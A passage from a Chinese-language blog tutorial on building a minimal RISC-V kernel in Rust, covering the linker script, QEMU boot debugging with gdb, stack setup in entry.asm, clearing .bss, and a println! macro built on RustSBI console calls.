100<br></code></pre></td></tr></table></figure><p>这可能需要一些汇编和内存布局的知识，就不展开了</p><p>然后在<code>main.rs</code>中嵌入这段汇编代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/main.rs</span><br><span class="hljs-meta">#![no_std]</span><br><span class="hljs-meta">#![no_main]</span><br><br><span class="hljs-keyword">mod</span> lang_items;<br><br><span class="hljs-keyword">use</span> core::arch::global_asm;<br>global_asm!(<span class="hljs-built_in">include_str!</span>(<span class="hljs-string">&quot;entry.asm&quot;</span>));<br></code></pre></td></tr></table></figure><p>由于<code>链接器</code>默认的内存布局并不能符合我们的要求，为了实现与QEMU正确对接，我们可以通过链接脚本(Linker Script)调整链接器的行为，使得最终生成的可执行文件的内存布局符合QEMU的预期，即内核第一条指令的地址应该位于<code>0x80200000</code></p><p>我们修改<code>cargo</code>的配置文件来使用我们自己的链接脚本<code>os/src/linker.ld</code>而非使用默认的内存布局!</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-comment">// os/.cargo/config</span><br>[build]<br><span class="hljs-keyword">target</span> = <span class="hljs-string">&quot;riscv64gc-unknown-none-elf&quot;</span><br><br>[<span class="hljs-keyword">target</span>.riscv64gc-unknown-none-elf]<br>rustflags = [<br>    <span class="hljs-string">&quot;-Clink-arg=-Tsrc/linker.ld&quot;</span>, <span class="hljs-string">&quot;-Cforce-frame-pointers=yes&quot;</span><br>]<br></code></pre></td></tr></table></figure><p>链接脚本<code>os/src/linker.ld</code>如下:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">OUTPUT_ARCH</span>(riscv)<br><span class="hljs-symbol">ENTRY</span>(_start)<br><span class="hljs-symbol">BASE_ADDRESS</span> = <span class="hljs-number">0x80200000</span><span class="hljs-comment">;</span><br><br><span class="hljs-symbol">SECTIONS</span><br>&#123;<br>    . = BASE_ADDRESS<span class="hljs-comment">;</span><br>    skernel = .<span class="hljs-comment">;</span><br><br>    stext = .<span class="hljs-comment">;</span><br>    <span class="hljs-meta">.text</span> : &#123;<br>        *(<span class="hljs-meta">.text</span>.entry)<br>        *(<span class="hljs-meta">.text</span> <span class="hljs-meta">.text</span>.*)<br>    &#125;<br><br>    . = <span class="hljs-meta">ALIGN</span>(<span class="hljs-number">4</span>K)<span class="hljs-comment">;</span><br>    etext = .<span class="hljs-comment">;</span><br>    srodata = .<span class="hljs-comment">;</span><br>    .rodata : &#123;<br>        *(.rodata .rodata.*)<br>        *(.srodata .srodata.*)<br>    &#125;<br><br>    . = <span class="hljs-meta">ALIGN</span>(<span class="hljs-number">4</span>K)<span class="hljs-comment">;</span><br>    erodata = .<span class="hljs-comment">;</span><br>    sdata = .<span class="hljs-comment">;</span><br>    <span class="hljs-meta">.data</span> : &#123;<br>        *(<span class="hljs-meta">.data</span> <span class="hljs-meta">.data</span>.*)<br>        *(.sdata .sdata.*)<br>    &#125;<br><br>    . = <span class="hljs-meta">ALIGN</span>(<span class="hljs-number">4</span>K)<span class="hljs-comment">;</span><br>    edata = .<span class="hljs-comment">;</span><br>    .bss : &#123;<br>        *(.bss.stack)<br>        sbss = .<span class="hljs-comment">;</span><br>        *(.bss .bss.*)<br>        *(.sbss .sbss.*)<br>    &#125;<br><br>    . = <span class="hljs-meta">ALIGN</span>(<span class="hljs-number">4</span>K)<span class="hljs-comment">;</span><br>    ebss = .<span class="hljs-comment">;</span><br>    ekernel = .<span class="hljs-comment">;</span><br><br>    /DISCARD/ : &#123;<br>        *(.eh_frame)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们将包含内核第一条指令的<code>.text.entry</code>段放在最终的<code>.text</code>段的最开头，同时由于在最终内存布局中代码段<code>.text</code>又是先于任何其它段的，因为所有的段都从<code>BASE_ADDRESS</code>也即<code>0x80200000</code>开始放置，这就能够保证内核的第一条指令正好放在<code>0x80200000</code>从而能够正确对接到QEMU上</p><p>随后便能生成内核可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cargo build --release<br>Finished release [optimized] target(s) <span class="hljs-keyword">in</span> 0.10s<br></code></pre></td></tr></table></figure><p>为了更直观，我们用gdb调试一下看一下这个过程</p><p>先启动QEMU</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ qemu-system-riscv64 \<br>    -machine virt \<br>    -nographic \<br>    -bios ../bootloader/rustsbi-qemu.bin \<br>    -device loader,file=target/riscv64gc-unknown-none-elf/release/os.bin,addr=0x80200000 \<br>    -s -S<br></code></pre></td></tr></table></figure><p>连接gdb</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">$ riscv64-unknown-elf-gdb <span class="hljs-string">\</span><br>    -ex <span class="hljs-string">&#x27;file target/riscv64gc-unknown-none-elf/release/os&#x27;</span> <span class="hljs-string">\</span><br>    -ex <span class="hljs-string">&#x27;set arch riscv:rv64&#x27;</span> <span class="hljs-string">\</span><br>    -ex <span class="hljs-string">&#x27;target remote localhost:1234&#x27;</span><br>[GDB output]<br><span class="hljs-number">0x0000000000001000</span> <span class="hljs-keyword">in</span> ?? ()<br></code></pre></td></tr></table></figure><p>对上了吧，从<code>0x1000</code>开始执行，我们看一下具体的指令</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nix">$ (gdb) x<span class="hljs-symbol">/10i</span> $pc<br><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span><span class="hljs-params">x1000:</span>  auipc   t0,<span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x1004:</span>     addi    a1,t0,<span class="hljs-number">32</span><br><span class="hljs-number">0</span><span class="hljs-params">x1008:</span>     csrr    a0,mhartid<br><span class="hljs-number">0</span><span class="hljs-params">x100c:</span>     ld      t0,<span class="hljs-number">24</span>(t0)<br><span class="hljs-number">0</span><span class="hljs-params">x1010:</span>     jr      t0<br><span class="hljs-number">0</span><span class="hljs-params">x1014:</span>     unimp<br><span class="hljs-number">0</span><span class="hljs-params">x1016:</span>     unimp<br><span class="hljs-number">0</span><span class="hljs-params">x1018:</span>     unimp<br><span class="hljs-number">0</span><span class="hljs-params">x101a:</span>     <span class="hljs-number">0</span>x8000<br><span class="hljs-number">0</span><span class="hljs-params">x101c:</span>     unimp<br></code></pre></td></tr></table></figure><p>我们单步</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$ </span>(gdb) si<br><span class="hljs-number">0x0000000000001004</span> <span class="hljs-keyword">in</span> <span class="hljs-string">??</span> ()<br><span class="hljs-variable">$ </span>(gdb) si<br><span class="hljs-number">0x0000000000001008</span> <span class="hljs-keyword">in</span> <span class="hljs-string">??</span> ()<br><span class="hljs-variable">$ </span>(gdb) si<br><span class="hljs-number">0x000000000000100c</span> <span class="hljs-keyword">in</span> <span class="hljs-string">??</span> ()<br><span class="hljs-variable">$ </span>(gdb) si<br><span class="hljs-number">0x0000000000001010</span> <span class="hljs-keyword">in</span> <span class="hljs-string">??</span> ()<br><span class="hljs-variable">$ </span>(gdb) p/x <span class="hljs-variable">$t0</span><br><span class="hljs-number">1</span> = <span class="hljs-number">0x80000000</span><br><span class="hljs-variable">$ </span>(gdb) si<br><span class="hljs-number">0x0000000080000000</span> <span class="hljs-keyword">in</span> <span class="hljs-string">??</span> ()<br></code></pre></td></tr></table></figure><p>ok啊来到了<code>0x80000000</code>，这意味着我们即将把控制权转交给<code>RustSBI</code></p><p>大致看一下</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">$ (gdb) x/10i $pc<br>=&gt; <span class="hljs-number">0x80000000</span>:      auipc   <span class="hljs-built_in">sp</span>,<span class="hljs-number">0x28</span><br><span class="hljs-number">0x80000004</span>: mv      <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span><br><span class="hljs-number">0x80000008</span>: lui     t0,<span class="hljs-number">0x4</span><br><span class="hljs-number">0x8000000a</span>: addi    t1,a0,<span class="hljs-number">1</span><br><span class="hljs-number">0x8000000e</span>: <span class="hljs-keyword">add</span>     <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,t0<br><span class="hljs-number">0x80000010</span>: addi    t1,t1,-<span class="hljs-number">1</span><br><span class="hljs-number">0x80000012</span>: bnez    t1,<span class="hljs-number">0x8000000e</span><br><span class="hljs-number">0x80000016</span>: j       <span class="hljs-number">0x8001125a</span><br><span class="hljs-number">0x8000001a</span>: unimp<br><span class="hljs-number">0x8000001c</span>: addi    <span class="hljs-built_in">sp</span>,<span class="hljs-built_in">sp</span>,-<span class="hljs-number">48</span><br>$ (gdb) <span class="hljs-built_in">si</span><br><span class="hljs-number">0x0000000080000004</span> <span class="hljs-keyword">in</span> ?? ()<br>$ (gdb) <span class="hljs-built_in">si</span><br><span class="hljs-number">0x0000000080000008</span> <span class="hljs-keyword">in</span> ?? ()<br>$ (gdb) <span class="hljs-built_in">si</span><br><span class="hljs-number">0x000000008000000a</span> <span class="hljs-keyword">in</span> ?? ()<br>$ (gdb) <span class="hljs-built_in">si</span><br><span class="hljs-number">0x000000008000000e</span> <span class="hljs-keyword">in</span> ?? ()<br></code></pre></td></tr></table></figure><p>随后我们在<code>0x80200000</code>打上断点，然后continue执行至此，检查控制权能否被移交给我们的内核</p><p>ps: 还好打pwn经常要用gdb 大概会一点 ρ(・ω・、)</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">$ (gdb) <span class="hljs-keyword">b </span>*<span class="hljs-number">0x80200000</span><br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">1</span> <span class="hljs-built_in">at</span> <span class="hljs-number">0x80200000</span><br>$ (gdb) c<br>Continuing.<br><br><span class="hljs-keyword">Breakpoint </span><span class="hljs-number">1</span>, <span class="hljs-number">0x0000000080200000</span> in ?? ()<br></code></pre></td></tr></table></figure><p>ok了拿下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$ </span>(gdb) x/<span class="hljs-number">5i</span> <span class="hljs-variable">$pc</span><br>=&gt; <span class="hljs-number">0x80200000</span>:      li      ra,<span class="hljs-number">100</span><br><span class="hljs-number">0x80200004</span>: unimp<br><span class="hljs-number">0x80200006</span>: unimp<br><span class="hljs-number">0x80200008</span>: unimp<br><span class="hljs-number">0x8020000a</span>: unimp<br><span class="hljs-variable">$ </span>(gdb) si<br><span class="hljs-number">0x0000000080200004</span> <span class="hljs-keyword">in</span> <span class="hljs-string">??</span> ()<br><span class="hljs-variable">$ </span>(gdb) p/d <span class="hljs-variable">$x1</span><br><span class="hljs-number">2</span> = <span class="hljs-number">100</span><br><span class="hljs-variable">$ </span>(gdb) p/x <span class="hljs-variable">$sp</span><br><span class="hljs-number">3</span> = <span class="hljs-number">0x0</span><br></code></pre></td></tr></table></figure><p>一切正常!进入下一阶段…</p><hr><h2 id="asm-to-rust"><a href="#asm-to-rust" class="headerlink" title="asm to rust"></a>asm to rust</h2><p>先回顾一下</p><p>我们成功在QEMU上执行了内核的第一条指令，它是我们在<code>entry.asm</code>中手写汇编代码得到的</p><p>然而，我们无论如何也不想仅靠手写汇编代码的方式编写我们的内核，绝大部分功能我们都想使用rust语言来实现，不过为了将控制权转交给我们使用rust语言编写的内核入口函数，我们确实需要手写若干行汇编代码进行一定的初始化工作</p><p>和之前一样，这些汇编代码放在<code>entry.asm</code>中，并在控制权被转交给内核相关函数前最先被执行，但它们的功能会更加复杂</p><p>首先需要<code>设置栈空间</code>，来在内核内使能函数调用，随后直接调用使用rust编写的内核入口函数，从而控制权便被移交给rust代码~</p><p>此处需要一些关于栈和函数调用的背景知识，不过，嘿嘿，也只是pwn的基本功罢了…</p><p>我们在<code>entry.asm</code>中分配启动栈空间，并在控制权被转交给rust入口之前将栈指针sp设置为栈顶的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm"># os/src/entry.asm<br>    .section .text.entry<br>    .globl _start<br>_start:<br>    la sp, boot_stack_top<br>    call rust_main<br><br>    .section .bss.stack<br>    .globl boot_stack_lower_bound<br>boot_stack_lower_bound:<br>    .space 4096 * 16<br>    .globl boot_stack_top<br>boot_stack_top:<br></code></pre></td></tr></table></figure><p>我们在内核的内存布局中预留了一块大小为<code>4096 * 16</code>字节也就是$64KiB$的空间用作接下来要运行的程序的栈空间</p><p>在risc-v架构上，栈是从高地址向低地址增长</p><p>因此，最开始的时候栈为空，栈顶和栈底位于相同的位置，我们用更高地址的符号<code>boot_stack_top</code>来标识栈顶的位置</p><p>同时，我们用更低地址的符号<code>boot_stack_lower_bound</code>来标识栈能够增长到的下限位置，它们都被设置为全局符号供其他目标文件使用~</p><p><img src="/images/61.png" alt="如图所示"></p><p>我们可以看到我们将这块空间放置在一个名为<code>.bss.stack</code>的段中，在链接脚本<code>linker.ld</code>中可以看到<code>.bss.stack</code>段最终会被汇集到<code>.bss</code>段中</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">.<span class="hljs-keyword">bss </span>: &#123;<br>    *(.<span class="hljs-keyword">bss.stack)</span><br><span class="hljs-keyword"></span>    <span class="hljs-keyword">sbss </span>= .;<br>    *(.<span class="hljs-keyword">bss </span>.<span class="hljs-keyword">bss.*)</span><br><span class="hljs-keyword"></span>    *(.<span class="hljs-keyword">sbss </span>.<span class="hljs-keyword">sbss.*)</span><br><span class="hljs-keyword"></span>&#125;<br>ebss = .;<br></code></pre></td></tr></table></figure><p>同时全局符号<code>sbss</code>和<code>ebss</code>分别指向<code>.bss</code>段除<code>.bss.stack</code>以外的起始和终止地址，我们在使用这部分数据之前需要将它们初始化为零</p><p>我们将栈指针<strong>sp</strong>设置为先前分配的启动栈栈顶地址，这样rust代码在进行函数调用和返回的时候就可以正常在启动栈上分配和回收栈帧了</p><div class="note note-danger">            <p>然而如果发生栈溢出就会很诡异了，先不管 ( ´•̥̥̥ω•̥̥̥&#96; )</p>           </div><p>至此，我们通过伪指令<code>call</code>调用rust编写的内核入口点<code>rust_main</code>将控制权转交给rust代码，该入口点在<code>main.rs</code>中实现</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/main.rs</span><br><span class="hljs-meta">#[no_mangle]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">rust_main</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">loop</span> &#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里需要注意的是需要通过宏将rust_main标记为<code>#[no_mangle]</code>以避免编译器对它的名字进行混淆，不然在链接的时候，entry.asm将找不到main.rs提供的外部符号rust_main从而导致链接失败</p><p>同时在rust_main函数的开场白中，我们将第一次在栈上分配栈帧并保存函数调用上下文，它也是内核运行全程中最底层的栈帧~</p><p>当然，在内核初始化中，需要先完成对<code>.bss</code>段的清零，这是内核很重要的一部分初始化工作，在使用任何被分配到.bss段的全局变量之前我们需要确保.bss段已被清零</p><p>我们就在rust_main的开头完成这一工作，由于控制权已经被转交给rust，我们终于不用手写汇编代码而是可以用rust来实现这一功能了! (≧∀≦)ゞ</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/main.rs</span><br><span class="hljs-meta">#[no_mangle]</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">rust_main</span>() <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-title function_ invoke__">clear_bss</span>();<br>    <span class="hljs-keyword">loop</span> &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">clear_bss</span>() &#123;<br>    <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br>        <span class="hljs-keyword">fn</span> <span class="hljs-title function_">sbss</span>();<br>        <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ebss</span>();<br>    &#125;<br>    (sbss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>..ebss <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>).for_each(|a| &#123;<br>        <span class="hljs-keyword">unsafe</span> &#123; (a <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>).<span class="hljs-title function_ invoke__">write_volatile</span>(<span class="hljs-number">0</span>) &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>涉及的rust语法:</p><ul><li><p>外部符号引用</p></li><li><p>迭代器与闭包</p></li><li><p>unsafe!</p></li></ul><div class="note note-success">            <p>tips: 我们将.bss段内的一个地址转化为一个<strong>裸指针</strong>(Raw Pointer)，并将它指向的值修改为0，这在c语言中是一种司空见惯的操作，但在rust中我们需要将其包裹在unsafe块中。这是因为，rust认为对于裸指针的<strong>解引用</strong>(Dereference)是一种unsafe行为。相比c语言，rust进行了更多的语义约束来保证安全性(内存安全&#x2F;类型安全&#x2F;并发安全)，这在编译期和运行期都有所体现。但在某些时候，尤其是与底层硬件打交道的时候，在rust的语义约束之内没法满足我们的需求，这个时候我们就需要将超出了rust语义约束的行为包裹在<strong>unsafe</strong>块中，告知编译器不需要对它进行完整的约束检查，而是由程序员自己负责保证它的安全性。当代码不能正常运行的时候，我们往往也是最先去检查<code>unsafe</code>块中的代码，因为它没有受到编译器的保护，出错的概率更大。</p>           </div><p>至此，我们通过分配栈空间并正确设置栈指针在内核中使能了函数调用并成功将控制权转交给了rust代码，从此我们终于可以利用强大的rust语言来编写内核的各项功能了!</p><hr><h2 id="实现helloworld"><a href="#实现helloworld" class="headerlink" title="实现helloworld!"></a>实现helloworld!</h2><p>接下来我们终于迎来最后一步</p><p>基于<code>RustSBI</code>提供的服务成功在屏幕上打印<code>Hello, world!</code></p><p>ps: 这也太艰难了 (╥﹏╥)</p><p>之前我们对<strong>RustSBI</strong>的了解仅限于它会在计算机启动时进行它所负责的环境初始化工作，并将计算机控制权移交给内核。但实际上作为内核的执行环境，它还有另一项职责：即在内核运行时响应内核的请求为内核提供服务。当内核发出请求时，计算机会转由RustSBI控制来响应内核的请求，待请求处理完毕后，计算机控制权会被交还给内核</p><p>我们将利用它实现打印字符串与退出程序的操作</p><p>先在<code>Cargo.toml</code>中引入<code>sbi_rt</code>依赖</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// os/Cargo.toml</span><br><span class="hljs-selector-attr">[dependencies]</span><br>sbi-rt = &#123; version = <span class="hljs-string">&quot;0.0.2&quot;</span>, features = <span class="hljs-selector-attr">[<span class="hljs-string">&quot;legacy&quot;</span>]</span> &#125;<br></code></pre></td></tr></table></figure><p>随后在<code>os/src/sbi.rs</code>中，我们直接调用<code>sbi_rt</code>提供的接口来将输出字符，并实现关机功能</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![allow(unused)]</span><br><span class="hljs-comment">/// 允许当前文件里存在未使用的函数、导入、变量</span><br><span class="hljs-comment">/// usize 64位</span><br><br><span class="hljs-comment">/// use sbi call to putchar in console (qemu uart handler)</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">console_putchar</span>(c: <span class="hljs-type">usize</span>) &#123;<br>    <span class="hljs-meta">#[allow(deprecated)]</span><br>    sbi_rt::legacy::<span class="hljs-title function_ invoke__">console_putchar</span>(c);<br>&#125;<br><br><span class="hljs-comment">/// use sbi call to getchar from console (qemu uart handler)</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">console_getchar</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> &#123;<br>    <span class="hljs-meta">#[allow(deprecated)]</span><br>    sbi_rt::legacy::<span class="hljs-title function_ invoke__">console_getchar</span>()<br>&#125;<br><br><span class="hljs-comment">/// use sbi call to shutdown the kernel</span><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">shutdown</span>(failure: <span class="hljs-type">bool</span>) <span class="hljs-punctuation">-&gt;</span> ! &#123;<br>    <span class="hljs-keyword">use</span> sbi_rt::&#123;NoReason, Shutdown, SystemFailure, system_reset&#125;;<br>    <span class="hljs-keyword">if</span> !failure &#123;<br>        <span class="hljs-comment">/// 正常退出</span><br>        <span class="hljs-title function_ invoke__">system_reset</span>(Shutdown, NoReason);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/// 系统异常 / panic</span><br>        <span class="hljs-title function_ invoke__">system_reset</span>(Shutdown, SystemFailure);<br>    &#125;<br>    <span class="hljs-comment">/// ! 永不返回</span><br>    <span class="hljs-built_in">unreachable!</span>()<br>&#125;<br></code></pre></td></tr></table></figure><p>但是<code>console_putchar</code>的功能过于受限，如果想打印一行<code>Hello world!</code>的话需要进行多次调用，因此我们将尝试自己编写基于<code>console_putchar</code>的<code>println!</code>宏!</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/main.rs</span><br><span class="hljs-meta">#[macro_use]</span><br><span class="hljs-keyword">mod</span> console;<br><br><span class="hljs-comment">// os/src/console.rs</span><br><span class="hljs-keyword">use</span> crate::sbi::console_putchar;<br><span class="hljs-keyword">use</span> core::fmt::&#123;<span class="hljs-keyword">self</span>, Write&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Stdout</span>;<br><br><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Write</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Stdout</span> &#123;<br>    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">write_str</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, s: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> fmt::<span class="hljs-type">Result</span> &#123;<br>        <span class="hljs-keyword">for</span> <span class="hljs-variable">c</span> <span class="hljs-keyword">in</span> s.<span class="hljs-title function_ invoke__">chars</span>() &#123;<br>            <span class="hljs-title function_ invoke__">console_putchar</span>(c <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">Ok</span>(())<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">print</span>(args: fmt::Arguments) &#123;<br>    Stdout.<span class="hljs-title function_ invoke__">write_fmt</span>(args).<span class="hljs-title function_ invoke__">unwrap</span>();<br>&#125;<br><br><span class="hljs-comment">//定义宏</span><br><span class="hljs-meta">#[macro_export]</span><br><span class="hljs-built_in">macro_rules!</span> print &#123;<br>    ($fmt: literal $(, $($arg: tt)+)?) =&gt; &#123;<br>        $crate::console::<span class="hljs-title function_ invoke__">print</span>(<span class="hljs-built_in">format_args!</span>($fmt $(, $($arg)+)?));<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#[macro_export]</span><br><span class="hljs-built_in">macro_rules!</span> println &#123;<br>    ($fmt: literal $(, $($arg: tt)+)?) =&gt; &#123;<br>        $crate::console::<span class="hljs-title function_ invoke__">print</span>(<span class="hljs-built_in">format_args!</span>(<span class="hljs-built_in">concat!</span>($fmt, <span class="hljs-string">&quot;\n&quot;</span>) $(, $($arg)+)?));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>语法比较神秘，不过原理很清晰!</p><p>这样我们就实现了直接调用<code>println!</code>就能实现打印字符串的操作!</p><div class="note note-info">            <p><strong>Rust Tips：Rust Trait</strong></p> 